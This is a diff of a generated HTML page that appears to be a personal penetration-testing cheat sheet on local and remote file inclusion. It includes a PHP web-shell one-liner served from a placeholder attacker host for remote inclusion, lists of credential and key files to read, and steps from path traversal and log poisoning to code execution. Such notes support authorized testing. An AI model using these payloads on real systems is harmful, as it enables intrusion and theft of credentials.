+copyBtnbtn_1072e160ad574ee59ffe2d8e4d19d068.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Host malicious PHP file on attacker\necho '<?php system($_GET[\"cmd\"]); ?>' > shell.php\npython3 -m http.server 8080\n\n# Include from target\n?file=http://$ATTACKER:8080/shell.php&cmd=id\n\n# HTTPS (if HTTP blocked)\n?file=https://$ATTACKER/shell.php&cmd=id\n\n# SMB (Windows targets)\n?file=\\\\$ATTACKER\\share\\shell.php\n`);copyBtnbtn_1072e160ad574ee59ffe2d8e4d19d068.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1072e160ad574ee59ffe2d8e4d19d068.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1203,19 +1221,19 @@ python3 -m http.server 8080
 </div></div>
 </div>
 </div>
-<div id="outline-container-orga435af8" class="outline-2">
-<h2 id="orga435af8">5. High-Value Files to Read</h2>
-<div class="outline-text-2" id="text-orga435af8">
+<div id="outline-container-org8825a6c" class="outline-2">
+<h2 id="org8825a6c">5. High-Value Files to Read</h2>
+<div class="outline-text-2" id="text-org8825a6c">
 </div>
-<div id="outline-container-org5c8689e" class="outline-3">
-<h3 id="org5c8689e">Linux</h3>
-<div class="outline-text-3" id="text-org5c8689e">
+<div id="outline-container-org064ecf8" class="outline-3">
+<h3 id="org064ecf8">Linux</h3>
+<div class="outline-text-3" id="text-org064ecf8">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_ff17b5a6aee740da9b1082cc3ca26db4>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_9a028e96bee04bd68f0881b49f5416ad>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_ff17b5a6aee740da9b1082cc3ca26db4=document.querySelector('button[name=btn_ff17b5a6aee740da9b1082cc3ca26db4]');
-copyBtnbtn_ff17b5a6aee740da9b1082cc3ca26db4.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`/etc/passwd                   # user accounts\n/etc/shadow                   # password hashes (needs root)\n/etc/hosts                    # internal hostnames\n/etc/hostname                 # machine name\n/etc/ssh/sshd_config          # SSH config\n/home/<user>/.ssh/id_rsa      # private SSH keys\n/var/www/html/config.php      # DB credentials\n/var/www/html/.env            # environment variables / secrets\n/proc/version                 # kernel version\n/proc/self/environ            # process environment variables\n/proc/self/cmdline            # current process command\n`);copyBtnbtn_ff17b5a6aee740da9b1082cc3ca26db4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ff17b5a6aee740da9b1082cc3ca26db4.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_9a028e96bee04bd68f0881b49f5416ad=document.querySelector('button[name=btn_9a028e96bee04bd68f0881b49f5416ad]');
+copyBtnbtn_9a028e96bee04bd68f0881b49f5416ad.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`/etc/passwd                   # user accounts\n/etc/shadow                   # password hashes (needs root)\n/etc/hosts                    # internal hostnames\n/etc/hostname                 # machine name\n/etc/ssh/sshd_config          # SSH config\n/home/<user>/.ssh/id_rsa      # private SSH keys\n/var/www/html/config.php      # DB credentials\n/var/www/html/.env            # environment variables / secrets\n/proc/version                 # kernel version\n/proc/self/environ            # process environment variables\n/proc/self/cmdline            # current process command\n`);copyBtnbtn_9a028e96bee04bd68f0881b49f5416ad.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9a028e96bee04bd68f0881b49f5416ad.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1234,15 +1252,15 @@ let res = copyTextToClipboard(`/etc/passwd                   # user accounts\n/e
 </div></div>
 </div>
 </div>
-<div id="outline-container-org641dba7" class="outline-3">
-<h3 id="org641dba7">Windows</h3>
-<div class="outline-text-3" id="text-org641dba7">
+<div id="outline-container-orga85df76" class="outline-3">
+<h3 id="orga85df76">Windows</h3>
+<div class="outline-text-3" id="text-orga85df76">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_5528841c20884e6f8c8d37cbb7354e37>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_2ac0575ccd284af2b907e97b81c5f341>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_5528841c20884e6f8c8d37cbb7354e37=document.querySelector('button[name=btn_5528841c20884e6f8c8d37cbb7354e37]');
-copyBtnbtn_5528841c20884e6f8c8d37cbb7354e37.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`C:\\Windows\\win.ini\nC:\\Windows\\System32\\drivers\\etc\\hosts\nC:\\inetpub\\wwwroot\\web.config      # DB connection strings, secrets\nC:\\xampp\\apache\\conf\\httpd.conf    # XAMPP config\nC:\\xampp\\php\\php.ini               # PHP config\nC:\\xampp\\phpMyAdmin\\config.inc.php # phpMyAdmin credentials\nC:\\Users\\<user>\\.ssh\\id_rsa        # SSH keys\n`);copyBtnbtn_5528841c20884e6f8c8d37cbb7354e37.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_5528841c20884e6f8c8d37cbb7354e37.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_2ac0575ccd284af2b907e97b81c5f341=document.querySelector('button[name=btn_2ac0575ccd284af2b907e97b81c5f341]');
+copyBtnbtn_2ac0575ccd284af2b907e97b81c5f341.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`C:\\Windows\\win.ini\nC:\\Windows\\System32\\drivers\\etc\\hosts\nC:\\inetpub\\wwwroot\\web.config      # DB connection strings, secrets\nC:\\xampp\\apache\\conf\\httpd.conf    # XAMPP config\nC:\\xampp\\php\\php.ini               # PHP config\nC:\\xampp\\phpMyAdmin\\config.inc.php # phpMyAdmin credentials\nC:\\Users\\<user>\\.ssh\\id_rsa        # SSH keys\n`);copyBtnbtn_2ac0575ccd284af2b907e97b81c5f341.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_2ac0575ccd284af2b907e97b81c5f341.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1258,15 +1276,15 @@ C:\Users\&lt;user&gt;\.ssh\id_rsa        # SSH keys
 </div>
 </div>
 </div>
-<div id="outline-container-org060c30d" class="outline-2">
-<h2 id="org060c30d">6. Testing Methodology</h2>
-<div class="outline-text-2" id="text-org060c30d">
+<div id="outline-container-org137f241" class="outline-2">
+<h2 id="org137f241">6. Testing Methodology</h2>
+<div class="outline-text-2" id="text-org137f241">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_11493eb0571449eda41bd3b75a1a81d6>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_e743b7aeaa7a47a58cd6508fbfdf8b4a>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_11493eb0571449eda41bd3b75a1a81d6=document.querySelector('button[name=btn_11493eb0571449eda41bd3b75a1a81d6]');
-copyBtnbtn_11493eb0571449eda41bd3b75a1a81d6.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`1. Identify parameters that appear to load content (page=, file=, template=)\n2. Test basic LFI: ../../../../etc/passwd\n3. If blocked: work through bypass list (null byte, encoding, filter tricks)\n4. If PHP: try php://filter to read source of app files\n5. Test log poisoning: inject User-Agent → include log file\n6. If LFI confirmed: escalate to RCE via one of the chains above\n7. If RFI: host shell.php and test include\n8. Document each step with request/response for report\n`);copyBtnbtn_11493eb0571449eda41bd3b75a1a81d6.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_11493eb0571449eda41bd3b75a1a81d6.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_e743b7aeaa7a47a58cd6508fbfdf8b4a=document.querySelector('button[name=btn_e743b7aeaa7a47a58cd6508fbfdf8b4a]');
+copyBtnbtn_e743b7aeaa7a47a58cd6508fbfdf8b4a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`1. Identify parameters that appear to load content (page=, file=, template=)\n2. Test basic LFI: ../../../../etc/passwd\n3. If blocked: work through bypass list (null byte, encoding, filter tricks)\n4. If PHP: try php://filter to read source of app files\n5. Test log poisoning: inject User-Agent → include log file\n6. If LFI confirmed: escalate to RCE via one of the chains above\n7. If RFI: host shell.php and test include\n8. Document each step with request/response for report\n`);copyBtnbtn_e743b7aeaa7a47a58cd6508fbfdf8b4a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e743b7aeaa7a47a58cd6508fbfdf8b4a.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1282,9 +1300,9 @@ let res = copyTextToClipboard(`1. Identify parameters that appear to load conten
 </div></div>
 </div>
 </div>
-<div id="outline-container-org755866e" class="outline-2">
-<h2 id="org755866e">7. Reporting Template</h2>
-<div class="outline-text-2" id="text-org755866e">
+<div id="outline-container-org26840d0" class="outline-2">
+<h2 id="org26840d0">7. Reporting Template</h2>
+<div class="outline-text-2" id="text-org26840d0">
 <p>
 <b>Classification:</b> File Inclusion (LFI / RFI)
 </p>
@@ -1304,7 +1322,7 @@ achieve Remote Code Execution under the web server account.
 <p>
 <b>Evidence:</b>
 </p>
-<pre class="example" id="org6632063">
+<pre class="example" id="orgf701360">
 # Step 1 — LFI confirmed
 GET /page.php?file=../../../../etc/passwd HTTP/1.1
 → root:x:0:0:root:/root:/bin/bash ...
@@ -1329,9 +1347,9 @@ GET /page.php?file=../../../../var/log/apache2/access.log&amp;cmd=id
 </ul>
 </div>
 </div>
-<div id="outline-container-org97b5f05" class="outline-2">
-<h2 id="org97b5f05">Tips</h2>
-<div class="outline-text-2" id="text-org97b5f05">
+<div id="outline-container-org0958bec" class="outline-2">
+<h2 id="org0958bec">Tips</h2>
+<div class="outline-text-2" id="text-org0958bec">
 <ul class="org-ul">
 <li>Always try <code>php://filter</code> before log poisoning — it is cleaner,
 requires no log write, and gives you source code of the app</li>
@@ -1348,6 +1366,20 @@ old PHP — also check for other low-hanging vulnerabilities</li>
 </div>
 </div>
 <div id="postamble" class="status">
+<div id='generated-footer' class='generated'><footer>
+ <nav>
+<div class='separator'></div>
+<a class='nav-author'href='https://gregoryhugaerts.github.io' >
+gregoryhugaerts.github.io
+</a>
+<input id='nav-toggle-bot' class='nav-toggle' type='checkbox'>
+<label class='nav-button' for='nav-toggle-bot'><span/></label>
+<div class='separator menu-sep'></div>
+<ul class='nav-list'>
+</ul>
+</nav>
+</footer>
+</div>
 <script type="text/javascript">
 <!--/*--><![CDATA[/*><!--*/
 if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
@@ -1355,6 +1387,7 @@ document.cookie = 'mode=dark'
 }
 document.cookie = 'light=modus-operandi-tinted'
 document.cookie = 'dark=modus-vivendi-tinted'
+document.cookie = 'options=collapsing:t__src-lang:t';
 /*
 ;; nice-org-html.js
 ;;==============================================================================
